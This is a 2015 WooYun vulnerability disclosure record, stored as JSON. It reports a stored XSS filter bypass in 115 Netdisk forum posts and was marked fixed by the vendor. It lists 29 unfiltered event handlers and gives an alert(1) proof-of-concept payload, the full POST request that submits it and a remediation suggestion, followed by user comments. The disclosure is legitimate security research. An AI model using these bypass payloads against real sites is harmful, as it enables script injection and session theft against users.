{"id": 47123, "wybug_id": "wooyun-2015-092959", "wybug_title": "115网盘存储型xss过滤强势绕过", "wybug_corp": "115网盘", "wybug_author": "Mr .LZH", "wybug_date": "2015-01-20 21:16", "wybug_open_date": "2015-02-04 12:06", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-04：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 为了绕过，fuzz了一晚上，累啊。。。。。 详细说明：  115网盘中进入圈子，发帖，尝试了很多payload不成功。<script><iframe>等等标签被过滤。onerror等等事件也被过滤。 经过一晚上事件fuzz，成功绕过，并总结出了29个可绕过的事件。 \nfscommandonbegin ondragdrop onend onhashchange oninput onmediacomplete onmediaerror onmessage onoffline onoutofsync onpause onpopstate onprogress onredo onrepeat onresume onreverse onrowsenter onrowdelete onrowinserted onseek onstorage onsyncrestored ontimeerror ontrackchange onundo onurlflip seeksegmenttime\n演示例子：发帖，进入html编辑模式，输入payload： <input oninput=alert(1)> \n\n post请求为：\nPOST /133130/post/save Host: q.115.comgid=133130&allow_notice=1&fids=&pickcodes=&category=&anonymous=0&allow_cates=&allow_uids=&validate=qaze&evq2gry6dkx=NzhlZDRkYWE5ZDA2MGEyNjNhYWU0YTFmfDE0MjE3NTAyMDE!&offer_reward=0&fb_price=10&addition=&content=%3Cp%3E%26nbsp%3Baaaa%E2%80%8B%26nbsp%3B%26nbsp%3B%3Cinput+oninput%3D%22alert(1)%22+value%3D%22%22%3E%3C%2Fp%3E&\nxss帖子地址为：http://q.115.com/t-133130-128569.html\n\n这个例子需要在框里输入内容促发，其它事件有部分可自动促发，这里不做演示。   漏洞证明：     修复方案：  过滤一下事件：\nfscommandonbegin ondragdrop onend onhashchange oninput onmediacomplete onmediaerror onmessage onoffline onoutofsync onpause onpopstate onprogress onredo onrepeat onresume onreverse onrowsenter onrowdelete onrowinserted onseek onstorage onsyncrestored ontimeerror ontrackchange onundo onurlflip seeksegmenttime\n花了一晚时间fuzz，又给了如此完整的结果，rank希望不要太坑   版权声明：转载请注明来源 Mr .LZH@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-01-20 21:22 厂商回复： 感谢报告！  最新状态： 2015-02-04：   ", "replys": "漏洞评价：\n评论\n     2015-01-20 22:12 |    \t\tdepycode \t\t\t( 普通白帽子  |\t\t\t        Rank:275 漏洞数:44        | 关注网络安全，提高技术！)\t\t \n  强势围观。    \n     2015-01-21 09:49 |    \t\t约吗 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 啪啪啪)\t\t \n  强势围观    \n     2015-01-21 18:44 |    \t\tzsrkmyn \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:3        | lazy...)\t\t \n  话说我也绕了一晚上咋就没绕过呢？    \n     2015-01-21 18:56 |    \t\tMr .LZH \t\t\t( 普通白帽子  |\t\t\t        Rank:583 漏洞数:75        | 非妹子勿扰···)\t\t \n  @zsrkmyn 得看你是插哪里，插的姿势如何    \n     2015-02-04 21:41 |    \t\tM4ster \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:7        | www.m4ster@gmail.com)\t\t \n  fuzz大法好    \n     2015-02-05 11:11 |    \t\thack2012 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:3        | 关注信息安全 http://www.waitalone.cn/)\t\t \n  这个不错，很强大。。    \n     2015-02-10 00:33 |    \t\tver007 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:5        | ver007爱好技术)\t\t \n  求联系    \n     2015-03-04 16:22 |    \t\tMr.R \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:14        | 求大神带我飞 qq2584110147)\t\t \n  @Mr .LZH 求教 0.0     \n     2015-03-04 19:07 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  @Mr .LZH 你很会插啊！！！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}